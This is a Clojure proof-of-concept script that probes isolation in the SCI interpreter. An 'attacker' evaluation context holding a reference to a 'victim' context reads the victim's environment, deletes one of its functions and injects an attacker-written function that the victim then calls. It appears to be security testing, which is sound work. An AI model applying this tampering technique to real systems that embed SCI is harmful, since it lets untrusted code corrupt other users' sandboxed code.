(require '[sci.core :as sci] '[sci.interrupt])
(def victim-ctx (sci/init {:namespaces {'clojure.core sci.interrupt/clojure-core}}))
(sci/eval-string* victim-ctx "(defn important [] :CORRECT)")
(println "victim-ctx before:" (sci/eval-string* victim-ctx "(important)"))
;; attacker ctx that merely HOLDS a reference to the victim ctx map
(def att (sci/init {:namespaces {'clojure.core sci.interrupt/clojure-core}}))
(sci/add-namespace! att 'other {'ctx (sci/new-var 'ctx victim-ctx {:ns (sci/create-ns 'other)})})
(defn p [l code] (println l (try (pr-str (sci/eval-string* att code)) (catch Throwable t (str "THREW: " (ex-message t))))))
(p "reach env atom:" "(str (type (:env other/ctx)))")
(p "list victim namespaces:" "(sort (keys (:namespaces @(:env other/ctx))))")
(p "DISSOC victim fn:" "(do (swap! (:env other/ctx) update-in [:namespaces 'user] dissoc 'important) :done)")
(println "victim-ctx after dissoc:" (try (pr-str (sci/eval-string* victim-ctx "(important)")) (catch Throwable t (str "THREW: " (ex-message t)))))
(p "REBIND victim fn to attacker fn:" "(let [v (get-in @(:env other/ctx) [:namespaces 'user 'important])] (str (type v)))")
(p "bindRoot via sci var (attacker-authored fn):"
   "(do (swap! (:env other/ctx) assoc-in [:namespaces 'user 'important2] (fn [] :ATTACKER)) :done)")
(println "victim calls injected:" (try (pr-str (sci/eval-string* victim-ctx "(important2)")) (catch Throwable t (str "THREW: " (ex-message t)))))
;; does instrument read var meta?
(require '[seon.instrument])
(println "instrument reads :malli/schema from var meta?:"
  (with-out-str (clojure.repl/source-fn 'seon.instrument/instrument!)))
